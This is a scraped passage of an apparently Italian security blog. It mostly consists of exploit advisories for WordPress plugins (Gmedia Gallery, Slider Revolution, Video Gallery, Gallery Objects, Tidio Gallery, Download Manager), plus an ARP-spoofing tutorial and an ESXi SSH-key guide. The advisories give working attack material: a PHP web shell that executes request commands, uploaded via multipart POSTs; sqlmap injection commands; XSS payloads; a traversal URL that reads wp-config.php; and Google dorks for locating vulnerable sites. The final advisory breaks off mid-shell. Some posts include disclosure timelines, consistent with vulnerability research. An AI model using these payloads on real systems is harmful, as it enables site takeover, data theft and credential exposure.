wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_75aacd302e2a4723897cb1d154c13f77=pippo%7C1407087221%7C7d38cc7811b5a07ab22e799069eed6e7; wp-settings-time-1=1406915840\rConnection=keep-alive\rPragma=no-cache\rCache-Control=no-cache\rPOSTDATA =-----------------------------304431219031197\rContent-Disposition: form-data; name=\u0026#34;name\u0026#34;\r.shell.php\r-----------------------------304431219031197\rContent-Disposition: form-data; name=\u0026#34;chunk\u0026#34;\r0\r-----------------------------304431219031197\rContent-Disposition: form-data; name=\u0026#34;chunks\u0026#34;\r1\r-----------------------------304431219031197\rContent-Disposition: form-data; name=\u0026#34;params\u0026#34;\rterms%5Bgmedia_category%5D=\u0026amp;terms%5Bgmedia_album%5D=\u0026amp;terms%5Bgmedia_tag%5D=\r-----------------------------304431219031197\rContent-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;.shell.php\u0026#34;\rContent-Type: application/octet-stream\r\u0026lt;?php\rif(isset($_REQUEST[\u0026#39;cmd\u0026#39;])){\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34;;\r$cmd = ($_REQUEST[\u0026#39;cmd\u0026#39;]);\rsystem($cmd);\recho \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\rdie;\r}\r?\u0026gt;\r-----------------------------304431219031197--\rBackdoor location:\rhttp://127.0.0.1/wordpress/wp-content/grand-media/application/.shell.php?cmd=pwd\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/08/02/wordpress-gmedia-gallery-1-2-1-shell-upload-vulnerability/","summary":"######################\r# Exploit Title : WordPress Gmedia Gallery 1.2.1 Shell Upload Vulnerability\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://www.codeasily.com/\r# Software Link : http://downloads.wordpress.org/plugin/grand-media.zip\r# Date : 2014-08-01\r# Tested on : Windows 7 / Mozilla Firefox\r######################\r# Description : Any authenticated user could upload php files (administrator by default).\r######################\r# Vulnerability Disclosure Timeline:\r2014-08-01: Discovered vulnerability\r2014-08-01: Vendor Notification (Twitter)\r2014-08-01: Vendor Response/Feedback 2014-08-02: Vendor Fix/Patch 2014-08-02: Public Disclosure ######################\r# PoC:\rPOST\rHost=127.","title":"WordPress Gmedia Gallery 1.2.1 Shell Upload Vulnerability"},{"content":"\n######################\r# Exploit Title : WordPress Slider Revolution Responsive \u0026lt;= 4.1.4 Arbitrary File Download vulnerability\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://codecanyon.net/item/slider-revolution-responsive-wordpress-plugin/2751380\r# Software Link : Premium plugin\r# Dork Google: revslider.php \u0026#34;index of\u0026#34;\r# Date : 2014-07-24\r# Tested on : Windows 7 / Mozilla Firefox\rLinux / Mozilla Firefox\r######################\r# Description\rWordpress Slider Revolution Responsive \u0026lt;= 4.1.4 suffers from Arbitrary File Download vulnerability\r######################\r# PoC\rhttp://victim/wp-admin/admin-ajax.php?action=revslider_show_image\u0026amp;img=../wp-config.php\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/07/28/wordpress-slider-revolution-arbitrary-file-download/","summary":"######################\r# Exploit Title : WordPress Slider Revolution Responsive \u0026lt;= 4.1.4 Arbitrary File Download vulnerability\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://codecanyon.net/item/slider-revolution-responsive-wordpress-plugin/2751380\r# Software Link : Premium plugin\r# Dork Google: revslider.php \u0026#34;index of\u0026#34;\r# Date : 2014-07-24\r# Tested on : Windows 7 / Mozilla Firefox\rLinux / Mozilla Firefox\r######################\r# Description\rWordpress Slider Revolution Responsive \u0026lt;= 4.1.4 suffers from Arbitrary File Download vulnerability\r######################\r# PoC\rhttp://victim/wp-admin/admin-ajax.","title":"WordPress Slider Revolution \u003c= 4.1.4 Arbitrary File Download vulnerability"},{"content":" Introduzione Come ben sappiamo i computers all’interno di una rete LAN comunicano tra di loro usufruendo delle schede di rete collegate agli switch o hub.\nLo switch è un dispositivo in grado di instradare i pacchetti di dati in modo logico, ovvero distribuisce al singolo pc i soli dati che ha richiesto (a livello di protocolli), evitando di fatto un invio su tutte le macchine (broadcast) come invece fa un hub.\nE’ chiaro che analizzando il traffico di un pc collegato ad un hub, a differenza dello switch, è possibile rilevare dati sensibili destinati ad altri computer della rete.\nPer aggirare l’instradamento degli switach è stata creato l’attacco ARP Cache Poisoning.\nARP Cache Poisoning è una tecnica, facente parte della famiglia “Man in the middle”, utilizzata per redirigere o intercettare il traffico tra due computer/dispositivi all’interno di una rete LAN.\nPer un penetration tester è importante conoscere gli attacchi man in the middle (MiM o MITM) perchè sicuramente si troverà a dover analizzare il livello di sicurezza di una rete aziendale.\nBasi ARP In una rete LAN quando due dispositivi vogliono comunicare tra di loro tramite host, FQDN (Fully Qualified Domain Name), o IP devono prima sapere quale è l’indirizzo MAC (Media Access Control) delle corrispettive schede di rete (NIC – Network Interface Card).\nPer compiere questa azione i dispositivi di rete usufruiscono del protocollo ARP (Address Resolution Protocol).\nEsempio:\nNella rete lan 192.168.0.0/255.255.255.0 c’è un pc con un client ftp ed indirzzo ip 10.0.0.11 (Win_Client) che si vuole collegare verso il server linux 10.0.0.10 (Linux_Server).\nWin_Client tramite protocollo ARP manda una richiesta broadcast chiedendo: Chi è il dispositivo che ha l’indirizzo ip 10.0.0.10 ?\nLinux_Server risponde: Io ho l’indirizzo 10.0.0.10 e il mio MAC address è: 00:1C:B3:09:85:15\nLa cache arp del dispositivo Win_Client conterrà la corrispondenza IP -\u0026gt; MAC Address fino al successivo aggiornamento.\nIl tempo di timeout della cache arp varia dalla tipologia di dispositivo e sistema operativo, ma sono tempistiche brevi.\nFino a quando la cache conterrà informazioni su un determinato indirizzo ip, il dispositivo non andrà a richiedere il corrispondente mac address al broadcast di rete.\nARP Cache Poisoning – Teoria Immaginiamo lo scenario in cui un malintenzionato vuole sfruttare la tecnica ARP Cache Poisoning, comunemente chiamata ARP Spoofing, per rubare le credenziali d’accesso che il client ftp (Win_Client) utilizzerà per collegarsi verso il server (Linux_Server).\nA questo punto gli attori del film “ARP Spoofing” sono tre:\n Win_Client -\u0026gt; Obbiettivo a cui intercettare il traffico (IP: 10.0.0.11 MAC: 0F:2C:56:01:63:32)  2) Linux_Server – \u0026gt; Server al quale si collegherà l’obbiettivo (IP: 10.0.0.10 MAC: 00:1C:B3:09:85:15)\nBack_Box -\u0026gt; Malintenzionato che intercetterà il traffico dell’obbiettivo (IP: 10.0.0.56 MAC: 00:8E:C2:07:85:11)  Il computer Back_Box tramite un tool di arp spoofing comincerà a spedire reiteratamente pacchetti arp al computer Win_Client facendogli credere che l’indirizzo MAC address del server ftp Linux_Server sia 00:8E:C2:07:85:11 (MAC Back_Box) invece che 00:1C:B3:09:85:15 (MAC Linux_Server).\nLa stessa azione verrà effettuta verso il server Linux_Server facendogli credere che l’indirizzo MAC address del client Win_Client sia 00:8E:C2:07:85:11 (MAC Back_Box) invece che 0F:2C:56:01:63:32 (MAC Win_Client).\nLe cache arp del computer Win_Client e del server Linux_Server saranno costantemente bombardate e aggiornate con l’indirizzo MAC del computer Back_Box.\nQuando Win_Client si collegherà al server ftp ed interrogherà la sua cache arp verrà instradato verso il computer Back_Box il quale, tramite forward, instraderà la connessione alla destinazione originale (Linux_Server).\nI pacchetti che torneranno indietro avranno la stessa sorte: Linux_Server -\u0026gt; Back_Box -\u0026gt; Win_Client .\nAnalizzando questo scenario possiamo tratte la conclusione che il computer Back_Box, tramite un programma packet sniffer, sarà in grado di leggere in chiaro tutto il traffico prodotto tra i computer Win_Client e Linux_Server. Naturalmente questo non vale per i protocolli criptati, ma l’username e password FTP non risiedono tra questi.\nARP Cache Poisoning – Pratica Arpspoof è un tool già presente nelle distribuzioni Kalilinux o BackBox e viene utilizzato proprio per eseguire attacchi di tipo arp cache poisoning.\nPrima di eseguire il programma si deve abilitare il forward dei pacchetti che passaranno dalla sche di rete della macchina Back_Box :\nroot@backbox3:/home/claudio/Desktop# echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward Configurato il forward è necessario aprire due terminali, nel primo digiteremo:\nroot@backbox3:/home/claudio/Desktop# arpspoof -i eth0 -t 10.0.0.11 10.0.0.10 Nel secondo:\nroot@backbox3:/home/claudio/Desktop# arpspoof -i eth0 -t 10.0.0.11 10.0.0.11 L’opzione “-i” di arpspoof serve a specificare l’interfaccia su cui deve agire il programma, mentre “-t” per specificare l’indirizzo ip dell’obbiettivo.\nCon il primo comando faremo credere a Win_Client che l’inidrizzo mac della nostra macchina (Back_Box) in realtà sia quello del Linux_Server, al contrario, col secondo comando faremo credere al Linux_Server che l’inidrizzo mac della nostra macchina (Back_Box) in realtà sia quello del Win_Client.\nAdesso tutti i pacchetti che transiteranno in LAN tra il Win_Client e il Linux_Server attraverseranno la scheda di rete della macchina Back_Box.\nARP Cache Poisoning – Sniffing Lo scopo dell arp spoofing è quello di catturare il traffico di una determinata macchina in modo da poterne carpire informazioni o dati sensibili.\nUtilizzano un software d’analisi dei protocolli, come ad esempio Wireshark, è possibile visualizzare e ricostruire tutto il traffico che passa in chiaro (non criptato) dalla propria scheda di rete.\nApriamolo sulla nostra Back_Box e dal menu in alto clicchiamo sul menu “Capture” e poi “Options“.\nNella finestra delle opzioni è necessario spuntare l’interfaccia di rete che vogliamo analizzare (eth0), rimuovere la spunta da “Use promiscuous mode on all interfaces” (in questo modo si evita di vedere traffico in eccesso, soprattutto se state testando il tutto da più macchine virtuali nello stesso player), e premere il bottone “START“.\nA questo punto eseguami una sessione FTP dal Win_Client al Linux_Server con l’uername “georgia” e la pass “password“, tornando sulla schermata di Wireshark vedremo:\n\nIl risultato è sorprendente, è possibile vedere tutto il contenuto della transizione tra il client e server ftp compreso username e password!\nARP Cache Poisoning – Soluzioni Qui di seguito elencherò una serie di contromisure minime da applicare all’interno della propria rete, meglio se contemporaneamente:\n Munirsi di switch con la funzione “Port Security“, in modo che per ciascuna porta del dispositivo possa esserci solo un MAC address. Installare un Intrusion Detection System (IDS) come ad esempio SNORT. Installare un ARP Monitor come arpwatch che permette di segnalare cambiamenti sospetti della rete. SARP ovvero Secure ARP, un’estensione del protocollo ARP che si basa sulla crittografia asimmetrica, così da poter autenticare il mittente.  ARP Cache Poisoning – Riferimenti   Penetration Testing – Georgia Weidman\n  ARP Poisoning – Wikipedia\n  ","permalink":"https://www.homelab.it/index.php/2014/07/28/arp-cache-poisoning/","summary":"Introduzione Come ben sappiamo i computers all’interno di una rete LAN comunicano tra di loro usufruendo delle schede di rete collegate agli switch o hub.\nLo switch è un dispositivo in grado di instradare i pacchetti di dati in modo logico, ovvero distribuisce al singolo pc i soli dati che ha richiesto (a livello di protocolli), evitando di fatto un invio su tutte le macchine (broadcast) come invece fa un hub.","title":"ARP Cache Poisoning o più comunemente ARP Spoofing"},{"content":"\n######################\r# Exploit Title : WordPress Video Gallery 2.5 SQL Injection and XSS Vulnerabilities\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery\r# Software Link : http://downloads.wordpress.org/plugin/contus-video-gallery.2.5.zip\r# Dork Google: inurl:/contus-video-gallery/hdflvplayer/hdplayer.swf\r(Click on \u0026#34;Repeat the search with the omitted results included\u0026#34;)\r# Date : 2014-07-15\r# Tested on : Windows 7 / Mozilla Firefox\rWindows 7 / sqlmap (0.8-1)\rLinux / Mozilla Firefox\rLinux / sqlmap 1.0-dev-5b2ded0\r######################\r# Vulnerability Disclosure Timeline:\r2014-07-15: Discovered vulnerability\r2014-07-16: Vendor Notification (Support e-mail address)\r2014-07-17: Vendor Response/Feedback 2014-07-23: Vendor Fix/Patch (same version number 2.5) 2014-07-24: Public Disclosure # Description\rWordpress Video Gallery 2.5 suffers from SQL injection and Cross Site Script vulnerabilities\r######################\r# PoC\r# Vulnerablity n°1:\r# SQL Injection 1 (Authentication NOT Required):\r1) Open the browser and connect to url http://VICTIM/wp-content/plugins/contus-video-gallery/myextractXML.php\r2) Copy a video_id number (ex. video_id=\u0026#34;1\u0026#34;)\r3) sqlmap -u \u0026#34;http://VICTIM/wp-admin/admin-ajax.php?action=myextractXML\u0026amp;vid=1\u0026#34; -p vid\r[21:02:40] [INFO] GET parameter \u0026#39;vid\u0026#39; is \u0026#39;AND boolean-based blind - WHERE or HAVING clause\u0026#39; injectable ...\r...\r...\r[21:03:34] [INFO] GET parameter \u0026#39;vid\u0026#39; is \u0026#39;MySQL \u0026gt; 5.0.11 AND time-based blind\u0026#39; injectable # SQL Injection 2 (Authentication Required):\rsqlmap --cookie=\u0026#34;INSER_WORDPRESS_COOKIE_HERE\u0026#34; -u \u0026#34;http://VICTIM/wp-admin/admin.php?page=newplaylist\u0026amp;playlistId=1\u0026#34; -p playlistId\rsqlmap --cookie=\u0026#34;INSER_WORDPRESS_COOKIE_HERE\u0026#34; -u \u0026#34;http://VICTIM/wp-admin/admin.php?page=newvideo\u0026amp;videoId=1\u0026#34; -p videoId\r######################\r# Vulnerablity n°2:\r# XSS Reflected Authenticated (/videoads/videoads.php, /video/video.php, /playlist/playlist.php )\r# PoC:\rPOST\rHost=VICTIM\rUser-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0\rAccept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language=it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3\rAccept-Encoding=gzip, deflate\rReferer=http://VICTIM/wp-admin/admin.php?page=videoads\rCookie=wordpress_b43b255bc018ee66673cd91980a723bf=usertest%7C1405626269%7Ce1559aa048ec23f2ddbb5a40290a3d2e; wp-settings-1=advImgDetails%3Dshow%26libraryContent%3Dupload%26wpfb_adv_uploader%3D1%26editor%3Dtinymce%26uploader%3D1; wp-settings-time-1=1405118515; bLicense54=true; __utma=86855576.2039073811.1404413871.1404413871.1404416567.2; __utmz=86855576.1404413871.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); s_fid=6EEA54B2DFA4150F-06C135149F70F3D9; wp-settings-time-2=1405287261; wp-settings-2=mfold%3Do%26libraryContent%3Dupload; cms-panel-collapsed-cms-content-tools-CMSPagesController=true; cms-panel-collapsed-cms-menu=false; cms-panel-collapsed-cms-content-tools-AssetAdmin=true; cms-panel-collapsed-cms-content-tools-CMSMain=false; redux_current_tab=0; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_b43b255bc018ee66673cd91980a723bf=usertest%7C1405626269%7Cd8c8ffae7aa7720d4fb3cb56537b1ea7\rConnection=keep-alive\rContent-Type=application/x-www-form-urlencoded\rContent-Length=110\rPOSTDATA=videoadssearchQuery=\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026amp;page=videoads\u0026amp;videoadsearchbtn=Search+Video+Ads\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww ","permalink":"https://www.homelab.it/index.php/2014/07/24/wordpress-video-gallery-vulnerabilities/","summary":"######################\r# Exploit Title : WordPress Video Gallery 2.5 SQL Injection and XSS Vulnerabilities\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery\r# Software Link : http://downloads.wordpress.org/plugin/contus-video-gallery.2.5.zip\r# Dork Google: inurl:/contus-video-gallery/hdflvplayer/hdplayer.swf\r(Click on \u0026#34;Repeat the search with the omitted results included\u0026#34;)\r# Date : 2014-07-15\r# Tested on : Windows 7 / Mozilla Firefox\rWindows 7 / sqlmap (0.8-1)\rLinux / Mozilla Firefox\rLinux / sqlmap 1.","title":"WordPress Video Gallery 2.5 SQL Injection/XSS Vulnerabilities"},{"content":"Per abilitare l’autenticazione ssh tramite chiave pubblica sul virtualizzatore VMware ESXi 5.x basta creare un nuovo file all’interno dell’hypervisor.\nPrendiamo come esempio la seguente chiave pubblica dell’utente root :\n_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfJAIbuQj+T0xD1uA3B1yOqsPCfORhRNLzkrA5OqW1HC2ZTdvgTj/UgP1KJ6UBC3Ux0DRIoEHwoPonG4XdwrSvQVaMYLG4G+kAHwZN5A3IL7D4aNGJPtMPmxfeVdsJHGCO2xIcpPmk/FpcJJW2IF3BlYqJr8sqbo6/odp0kNK83ROuek0Lbaqhs/NE1rxfKbYouko9Rg/DBnKIIIITxWYZuYYqa+uXPzprpb8n6YX5+EkiuTo9to0dyA/M5kYcRrbrv1aYjU2HsmQJiDz+x4KHvHIrAjcf0t9Fu5yLuV0KuiTnzdYL+FojkVNyW/hXNaT4fWI2iKYEaCc7vedqAPiZ root@backbox3_ SSH Public key su ESXi 5.x —\u0026gt; Test Connessione senza chiave Proviamo a stabilire una connessione ssh da una distribuzione linux verso il virtualizzatore ESXi 5.x (10.0.0.3)\nroot@backbox3:~# ssh 10.0.0.3 The authenticity of host \u0026#39;10.0.0.3 (10.0.0.3)\u0026#39; can\u0026#39;t be established. RSA key fingerprint is ac:f3:21:03:c8:26:ed:7f:cd:a2:e5:75:ae:62:69:09. Are you sure you want to continue connecting (yes/no)? yes Warning: Permanently added \u0026#39;10.0.0.3\u0026#39; (RSA) to the list of known hosts. Password: SSH Public key su ESXi 5.x —\u0026gt; Copia della chiave Per copiare la chiave pubblica verso il virtualizzatore è possibile utilizzare almeno due metodi:\n Trasferimento della chiave tramite scp:  root@backbox3:~# scp /root/.ssh/id_rsa.pub 10.0.0.3:/etc/ssh/keys-root/authorized_keys Password: \u0026lt;--- Inserisci password id_rsa.pub 100% 395 0.4KB/s 00:00 root@backbox3:~# Creare il file authorized_keys direttamente sul virtualizzatore  Collegarsi tramite ssh client sul virtualizzatore e creare il file authorized_keys con il comando\nroot@backbox3:~# ssh 10.0.0.3 Password:\u0026lt;--- Inserisci password The time and date of this login have been sent to the system logs. VMware offers supported, powerful system administration tools. Please see www.vmware.com/go/sysadmintools for details. The ESXi Shell can be disabled by an administrative user. See the vSphere Security documentation for more information. ~ # vi /etc/ssh/keys-root/authorized_keys Copiare il contenuto della chiave pubblica all’interno del file e uscire salvando le modifiche.\nAttenzione!!! la chiave pubblica deve essere copiata tutta sulla stessa riga\nSSH Public key su ESXi 5.x —\u0026gt; Test Connessione con la chiave root@backbox3:~# ssh 10.0.0.3 The time and date of this login have been sent to the system logs. VMware offers supported, powerful system administration tools. Please see www.vmware.com/go/sysadmintools for details. The ESXi Shell can be disabled by an administrative user. See the vSphere Security documentation for more information. ~ # SSH Public key su ESXi 5.x —\u0026gt; Disabilitare autenticazione SSH con password Per accedere al demone ssh dell’ESXi 5 soltanto tramite chiave pubblica si deve editare il file:/etc/ssh/sshd_config e modificare:\nChallengeResponseAuthenticatio yes PasswordAuthentication yes in\nChallengeResponseAuthenticatio no PasswordAuthentication no Infine riavviare il server ssh:\n~ # /etc/init.d/SSH restart SSH login disabled SSH login enabled ~ # Referenze: http://kb.vmware.com/selfservice/microsites/search.do?language=en_US\u0026amp;cmd=displayKC\u0026amp;externalId=1002866\n","permalink":"https://www.homelab.it/index.php/2014/07/19/ssh-public-key-su-esxi-5-x/","summary":"Per abilitare l’autenticazione ssh tramite chiave pubblica sul virtualizzatore VMware ESXi 5.x basta creare un nuovo file all’interno dell’hypervisor.\nPrendiamo come esempio la seguente chiave pubblica dell’utente root :\n_ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfJAIbuQj+T0xD1uA3B1yOqsPCfORhRNLzkrA5OqW1HC2ZTdvgTj/UgP1KJ6UBC3Ux0DRIoEHwoPonG4XdwrSvQVaMYLG4G+kAHwZN5A3IL7D4aNGJPtMPmxfeVdsJHGCO2xIcpPmk/FpcJJW2IF3BlYqJr8sqbo6/odp0kNK83ROuek0Lbaqhs/NE1rxfKbYouko9Rg/DBnKIIIITxWYZuYYqa+uXPzprpb8n6YX5+EkiuTo9to0dyA/M5kYcRrbrv1aYjU2HsmQJiDz+x4KHvHIrAjcf0t9Fu5yLuV0KuiTnzdYL+FojkVNyW/hXNaT4fWI2iKYEaCc7vedqAPiZ root@backbox3_ SSH Public key su ESXi 5.x —\u0026gt; Test Connessione senza chiave Proviamo a stabilire una connessione ssh da una distribuzione linux verso il virtualizzatore ESXi 5.x (10.0.0.3)\nroot@backbox3:~# ssh 10.0.0.3 The authenticity of host \u0026#39;10.0.0.3 (10.0.0.3)\u0026#39; can\u0026#39;t be established.","title":"SSH Public key su ESXi 5.x"},{"content":"\n######################\r# Exploit Title : WordPress Gallery Objects 0.4 SQL Injection\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://galleryobjects.com/\r# Software Link : http://downloads.wordpress.org/plugin/gallery-objects.0.4.zip\r# Dork Google: inurl:/admin-ajax.php?action=go_view_object # Date : 2014-07-18\r# Tested on : Windows 7 / Mozilla Firefox\rWindows 7 / sqlmap (0.8-1)\rLinux / Mozilla Firefox\rLinux / sqlmap 1.0-dev-5b2ded0\r######################\rPoc via Browser:\rhttp://VICTIM/wp-admin/admin-ajax.php?action=go_view_object\u0026amp;viewid=1[ and 1=2]\u0026amp;type=html\rsqlmap:\rsqlmap -u \u0026#34;http://VICTIM/wp-admin/admin-ajax.php?action=go_view_object\u0026amp;viewid=1\u0026amp;type=html\u0026#34; -p viewid\r---\rPlace: GET\rParameter: viewid\rType: boolean-based blind\rTitle: AND boolean-based blind - WHERE or HAVING clause\rPayload: action=go_view_object\u0026amp;viewid=475 AND 7403=7403\u0026amp;type=html\r---\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww ","permalink":"https://www.homelab.it/index.php/2014/07/18/wordpress-gallery-objects-0-4-sql-injection/","summary":"######################\r# Exploit Title : WordPress Gallery Objects 0.4 SQL Injection\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://galleryobjects.com/\r# Software Link : http://downloads.wordpress.org/plugin/gallery-objects.0.4.zip\r# Dork Google: inurl:/admin-ajax.php?action=go_view_object # Date : 2014-07-18\r# Tested on : Windows 7 / Mozilla Firefox\rWindows 7 / sqlmap (0.8-1)\rLinux / Mozilla Firefox\rLinux / sqlmap 1.0-dev-5b2ded0\r######################\rPoc via Browser:\rhttp://VICTIM/wp-admin/admin-ajax.php?action=go_view_object\u0026amp;viewid=1[ and 1=2]\u0026amp;type=html\rsqlmap:\rsqlmap -u \u0026#34;http://VICTIM/wp-admin/admin-ajax.php?action=go_view_object\u0026amp;viewid=1\u0026amp;type=html\u0026#34; -p viewid\r---\rPlace: GET\rParameter: viewid\rType: boolean-based blind\rTitle: AND boolean-based blind - WHERE or HAVING clause\rPayload: action=go_view_object\u0026amp;viewid=475 AND 7403=7403\u0026amp;type=html\r---\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.","title":"WordPress Gallery Objects 0.4 SQL Injection"},{"content":"\n######################\r# Exploit Title : WordPress Tidio Gallery 1.1 Shell Upload and XSS Vulnerabilities\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://www.tidioelements.com/\r# Software Link : http://downloads.wordpress.org/plugin/tidio-gallery.zip\r# Date : 2014-07-14\r# Tested on : Windows 7 / Mozilla Firefox\r######################\r# Location : http://VICTIM/wp-content/plugins/tidio-gallery/popup-insert-help.php -\u0026gt; XSS\rhttp://VICTIM/wp-content/plugins/tidio-gallery/popup-insert-post.php -\u0026gt; Upload Shell\r######################\r# Vulnerablity n°1:\rXSS Reflected Unauthenticated\rhttp://VICTIM/wp-content/plugins/tidio-gallery/popup-insert-help.php?galleryId=\u0026#34;/\u0026gt;\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\r# Vulnerablity n°2:\rUnprivileged user like subscriber could upload shell script.\rThe plugin rename file with \u0026#34;md5(microtime())\u0026#34; php functions. 1) Connect to url: http://VICTIM/wp-admin/admin-ajax.php?action=tidio_gallery_popup_insert_post\r2) Click \u0026#34;add gallery\u0026#34; button\r3) Click \u0026#34;edit\u0026#34; option\r4) Click \u0026#34;add image\u0026#34; button\r5) Click \u0026#34;upload\u0026#34; option and select php shell from local drive\r6) Refresh page (ex. press F5 key)\r7) View source page (ex. right-click -\u0026gt; view source page) and search string like this: \u0026#34;fileUrl\u0026#34;:\u0026#34;http://VICTIM/wp-content/uploads/2014/07/14625a7ca5df93c49910a502ef9aabfb.php\u0026#34;\rSkip file with \u0026#34;*-thumb.php\u0026#34; extension.\r8) Open browser and connect to http://VICTIM/wp-content/uploads/2014/07/14625a7ca5df93c49910a502ef9aabfb.php\r#####################\rDiscovered By : Claudio Viviani\rhttp://www.homelab.it\rinfo@homelab.it\rhomelabit@protonmail.ch\rhttps://www.facebook.com/homelabit\rhttps://twitter.com/homelabit\rhttps://plus.google.com/+HomelabIt1/\rhttps://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww\r##################### ","permalink":"https://www.homelab.it/index.php/2014/07/15/wordpress-tidio-gallery-1-1-vulnerabilities/","summary":"######################\r# Exploit Title : WordPress Tidio Gallery 1.1 Shell Upload and XSS Vulnerabilities\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : http://www.tidioelements.com/\r# Software Link : http://downloads.wordpress.org/plugin/tidio-gallery.zip\r# Date : 2014-07-14\r# Tested on : Windows 7 / Mozilla Firefox\r######################\r# Location : http://VICTIM/wp-content/plugins/tidio-gallery/popup-insert-help.php -\u0026gt; XSS\rhttp://VICTIM/wp-content/plugins/tidio-gallery/popup-insert-post.php -\u0026gt; Upload Shell\r######################\r# Vulnerablity n°1:\rXSS Reflected Unauthenticated\rhttp://VICTIM/wp-content/plugins/tidio-gallery/popup-insert-help.php?galleryId=\u0026#34;/\u0026gt;\u0026lt;script\u0026gt;alert(1);\u0026lt;/script\u0026gt;\r# Vulnerablity n°2:\rUnprivileged user like subscriber could upload shell script.","title":"WordPress Tidio Gallery 1.1 Shell Upload and XSS Vulnerabilities"},{"content":"\n######################\r# Exploit Title : WordPress Download Manager 2.6.8 Shell Upload Vulnerability\r# Exploit Author : Claudio Viviani\r# Vendor Homepage : www.wpdownloadmanager.com\r# Software Link : http://downloads.wordpress.org/plugin/download-manager.zip\r# Date : 2014-07-11\r# Tested on : Linux / Mozilla Firefox / WordPress Download Manager 2.6.8 Free Version\r# # # WORK ONLY ON SERVER WITH .HTACCESS FILES DISABLED\r######################\r# Location : http://IP_VICTIM/wp-content/plugins/download-manager/wpdm-add-new-file.php\r######################\r# Description :\rWordPress Download Manager 2.6.8 suffers from a remote shell upload vulnerability.\rAuthor or Administrator user could upload shell script (Default Settings).\rThere are no settings to exclude php extensions.\r######################\r# PoC :\rPOST\rHost=10.0.0.67\rUser-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0\rAccept=text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\rAccept-Language=it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3\rAccept-Encoding=gzip, deflate\rReferer=http://IP_VICTIM/wp-admin/admin.php?page=file-manager/add-new-file\rContent-Length=775\rContent-Type=multipart/form-data; boundary=---------------------------298331869519772\rCookie=wordpress_b43b255bc018ee66673cd91980a723bf=usernametest%7C1405260002%7C76c1b315f6f8b6e1885921a763036464; wp-settings-1=advImgDetails%3Dshow%26libraryContent%3Dupload%26wpfb_adv_uploader%3D1%26editor%3Dtinymce%26uploader%3D1; wp-settings-time-1=1405085177; bLicense54=true; testpopup=true; __utma=86855576.2039073811.1404413871.1404413871.1404416567.2; __utmz=86855576.1404413871.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); s_fid=6EEA54B2DFA4150F-06C135149F70F3D9; wp-settings-time-2=1404901595; wp-settings-2=mfold%3Do; cms-panel-collapsed-cms-content-tools-CMSPagesController=true; cms-panel-collapsed-cms-menu=false; cms-panel-collapsed-cms-content-tools-AssetAdmin=true; cms-panel-collapsed-cms-content-tools-CMSMain=false; wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_b43b255bc018ee66673cd91980a723bf=usernametest%7C1405260002%7Cf8b04eec8327ab6f17d0b28ce02fe66e\rConnection=keep-alive\rPragma=no-cache\rCache-Control=no-cache\rPOSTDATA =-----------------------------298331869519772\rContent-Disposition: form-data; name=\u0026#34;name\u0026#34;\rshell.php\r-----------------------------298331869519772\rContent-Disposition: form-data; name=\u0026#34;_ajax_nonce\u0026#34;\r1cfccd7168\r-----------------------------298331869519772\rContent-Disposition: form-data; name=\u0026#34;action\u0026#34;\rfile_upload\r-----------------------------298331869519772\rContent-Disposition: form-data; name=\u0026#34;async-upload\u0026#34;; filename=\u0026#34;shell.php\u0026#34;\rContent-Type: application/octet-stream\r\u0026lt;?php\rif(isset($_REQUEST[\u0026#39;cmd\u0026#39;])){\recho 